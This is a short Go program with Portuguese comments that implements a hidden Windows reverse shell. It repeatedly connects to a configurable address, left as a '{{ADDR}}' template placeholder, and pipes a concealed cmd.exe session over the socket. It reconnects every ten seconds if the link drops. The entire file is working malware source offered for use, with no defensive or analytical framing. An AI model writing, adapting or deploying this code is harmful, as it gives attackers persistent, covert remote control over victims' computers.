// feito por M1000 - github.com/curious0w

package main

import (
	"net"
	"os/exec"
	"syscall"
	"time"
)

func main() {

	configAddr := "{{ADDR}}"
	
	for {
		// Tenta conectar no endereço configurado
		c, err := net.DialTimeout("tcp", configAddr, 15*time.Second)
		
		if err == nil {
			// Prepara o CMD de forma oculta
			cmd := exec.Command("cmd.exe")
			
			// Atributos para não abrir janela no Windows
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			
			cmd.Stdin = c
			cmd.Stdout = c
			cmd.Stderr = c
			
			// Executa e aguarda a sessão terminar
			cmd.Run()
			c.Close()
		}

		// Se a conexão cair ou falhar, espera 10 segundos antes de tentar de novo
		time.Sleep(10 * time.Second)
	}
}